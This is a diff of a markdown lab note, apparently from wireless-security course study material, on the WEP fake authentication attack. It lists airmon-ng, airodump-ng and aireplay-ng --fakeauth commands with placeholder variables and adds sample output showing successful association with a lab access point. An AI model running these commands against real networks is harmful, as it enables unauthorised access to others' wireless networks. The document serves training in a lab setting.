@@ -5,22 +5,41 @@ The fake authentication attack allows you to perform the two types of WEP authen
 ## Commands
 
 * Run [setup](../../setup.md) first
-* Two terminals needed here, so use `screen` or log in twice
-     * Make sure terminal is full screen
-* Make sure that there are no associated clients connected to target AP
+* Two terminals are needed, so `screen` is your friend
+* No clients should be associated with AP or at least clients are idle
 
 ```bash
 # [Terminal One]
 # Set interface to monitor mode
-sudo airmon-ng start $DEVICE $CHANNEL
+sudo airmon-ng start $ADAPTER $CHANNEL
 
-# Start monitoring
+# Start monitoring - make terminal large enough to see everything
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE
 
 # [Terminal Two]
 # Run the fake authentication attack
 sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE
 ```
+
+```bash
+# Success
+01:56:20  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 3
+01:56:20  Sending Authentication Request (Open System) [ACK]
+01:56:20  Authentication successful
+01:56:20  Sending Association Request [ACK]
+01:56:20  Association successful :-) (AID: 1)
+
+# Also a new client is added and AUTH set to OPN
+[CH  3 ][ Elapsed: 5 mins ][ 2023-06-13 01:57 ][ paused output
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+AA:BB:CC:DD:EE:FF  -53 100     2987      303    0   3   54e. WEP  WEP    OPN  wifu
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+AA:BB:CC:DD:EE:FF  AA:AA:AA:AA:AA -71   54e-54e     0      457
+```
+## Wireshark
+
+TBD
 
 ## References
 
